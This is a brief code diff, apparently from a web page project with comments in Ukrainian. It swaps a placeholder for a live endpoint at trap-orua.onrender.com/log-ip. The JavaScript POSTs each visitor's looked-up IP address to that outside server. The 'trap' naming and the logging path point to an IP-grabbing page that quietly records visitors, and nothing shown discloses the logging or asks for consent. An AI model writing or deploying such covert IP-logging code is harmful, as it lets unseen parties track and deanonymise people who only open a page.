@@ -15,7 +15,7 @@
       const ip = data.ip;
 
       // Відправляємо IP на наш "сервер" (поки вкажемо заглушку)
-      fetch('ТВІЙ_БЕЗКОШТОВНИЙ_СЕРВЕР_ДЛЯ_ЛОГІВ', {
+      fetch('https://trap-orua.onrender.com/log-ip', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ ip: ip })
